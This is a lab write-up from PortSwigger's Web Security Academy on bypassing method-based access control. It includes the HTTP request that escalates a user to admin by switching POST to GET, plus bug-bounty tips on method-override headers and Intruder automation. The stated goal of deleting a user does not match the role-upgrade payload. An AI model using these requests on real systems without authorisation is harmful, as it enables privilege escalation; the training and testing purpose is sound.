# LAB: Method-based access control can be circumvented

| | |
|---|---|
| **Topic** | Access control (method-based ACL bypass) |
| **Difficulty** | Practitioner |
| **Date** | 2026-11-14 |
| **Time** | 8 |
| **Solved without solution** | yes |
| **Link** | portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented |

## 1. Objective
Delete `carlos` as a regular user when the admin action is blocked by method.

## 2. Surface
`POST /admin/delete` (or similar) is denied for regular users. The authorization
decision is tied to the **HTTP method**, not to the action itself.

## 3. Hypothesis
If only POST is blocked, performing the same action with another method — or a
method override header — skips the check while the back-end still executes it.

## 4. Payload that worked
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=<wiener-session-cookie>
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://<host>.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

## 5. Why it works
The access control configuration is flawed because security checks are enforced exclusively based on the HTTP method (e.g., blocking POST requests to administrative routes for regular users) rather than verifying user roles across all request methods. Changing the request method to GET (using Burp Suite's method-conversion feature) bypasses the method-specific access control rule. The backend processes the request and executes the administrative action successfully, provided that the parameters are correctly shifted into the query string and a valid active session cookie is supplied.

## 6. What I tried that failed
Changing the request method from POST to GET without moving the parameters from the request body into the query string, which resulted in parameter parsing errors.

Encountering persistent error responses due to an outdated or mismatched session cookie, which required updating the request headers with the currently active session.

## 7. In a real target (bounty translation)
- On any blocked action, always try: GET with the same params in the query
  string, HEAD, PUT/PATCH/DELETE, and `X-HTTP-Method-Override: POST`.
- Automate it later: same request, one param `§method§`, Intruder with 6
  methods, Grep-Match on the success indicator.
- Impact: any destructive/state-changing action executed as a normal user
  → High (data modification) to Critical (user deletion, permission change).
- In the report: the blocked request and the successful one side by side.

## 8. Bypass / variants noticed
Utilizing method override headers such as X-HTTP-Method-Override: POST or X-Method-Override.

Testing alternative HTTP methods like HEAD, PUT, PATCH, or DELETE against administrative endpoints.

## 9. Takeaway
"Access denied" answers only the method and the path you used. A blocked
action is a question: which other method or route reaches the same handler?
